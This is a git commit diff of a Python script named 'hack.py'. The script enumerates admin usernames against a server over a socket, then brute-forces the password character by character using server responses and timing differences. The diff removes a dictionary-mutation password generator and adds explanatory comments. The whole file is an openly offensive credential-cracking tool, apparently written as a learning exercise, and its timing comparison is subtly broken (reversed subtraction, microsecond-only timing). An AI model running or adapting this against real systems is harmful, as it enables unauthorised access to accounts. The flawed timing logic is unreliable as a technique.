dc5a27e01c52b30e34dabaaccd33b0cd2d15ebae
nadrowskyy <70075401+nadrowskyy@users.noreply.github.com>
2020-10-08 08:44:05 +0200

    Update hack.py

--- hack.py
+++ hack.py
@@ -11,19 +11,8 @@ def brute_force():
     for i in product:
         yield i
 
-def password_base(l):
-    with open('passwords.txt', 'r') as f:
-        for line in list(f)[l:l+1]:
-            #print(line.strip())
-            word = line[:-1]
-            word_upper = line.upper()[:-1]
-            # print(word)
-            # print(word_upper)
-            passwords = map(''.join, itertools.product(*zip(word, word_upper)))
-            for password in passwords:
-                yield password
-
 def login_base():
+    # in logins.txt file we have list of admin logins, one of is correct and allow us to connect with the server
     with open('logins.txt', 'r') as logins:
         for login in list(logins):
             yield login.strip()
@@ -31,24 +20,29 @@ def login_base():
 def connection():
     connection = socket.socket()
     # pobieranie adresu z argumentu podanego przy wywołaniu
+    # taking address from argument given during launching .py file through windows cmd
     address = sys.argv[1]
     # pobieranie portu z argumentu
+    # taking port number from argument
     port = int(sys.argv[2])
-    # łączenie
+    # connecting with the server
     connection.connect((address, port))
+    # response from the server for purpose of the code below
     str_response = {"result": ""}
-    #i = 0
     for suppose_login in login_base():
+        # firstly we check which login is correct to connect the server, password now can be empty
         login_data = {"login": suppose_login, "password": ' '}
+        # messages to and from server and sent in json format
         json_login_data = json.dumps(login_data)
-        # wysyłanie wiadomości czyli loginu bez hasła
         connection.send((json_login_data.encode()))
+        # measure time of server respond
         start = datetime.now().microsecond
-        # pobieranie odpowiedzi, login się zgadza lub nie
         response = connection.recv(1024)
         end = datetime.now().microsecond
+        # if login is correct we get answer from the server in a very quick time
         difference = end - start
         str_response = json.loads(response.decode())
+        # if login was correct we're receiving "Wrong password!" response from server
         if str_response["result"] == "Wrong password!":
             login = suppose_login
             suppose_password = ''
@@ -56,26 +50,23 @@ def connection():
             while(True):
                 generator = brute_force()
                 for i in generator:
+                    # collecting password letter by letter and checking if it's correct
                     suppose_password += i[0]
                     login_data = {"login": login, "password": suppose_password}
                     json_login_data = json.dumps(login_data)
-                    # wysyłanie wiadomości czyli hasła
                     connection.send((json_login_data.encode()))
                     start = datetime.now().microsecond
                     response = connection.recv(1024)
                     end = datetime.now().microsecond
                     difference_password = start - end
                     str_response = json.loads(response.decode())
+                    # if password is correct we get answer in a very quick time if answer time is longer we know that
+                    # password that we've sent is wrong
                     if difference_password > difference:
                         password = suppose_password
                         break
-                    # if str_response["result"] == "Exception happened during login":
-                    #     # suppose_password += i[0]
-                    #     password = suppose_password
-                    #     break
-                    # elif difference_password <= difference:
-                    #     suppose_password = password
-                    #     continue
+                    # each time we sent a password that we think is correct we get "Wrong password!" answer but
+                    # in this implement we depend on respond time from the server
                     elif str_response["result"] == "Wrong password!":
                         suppose_password = password
                         continue
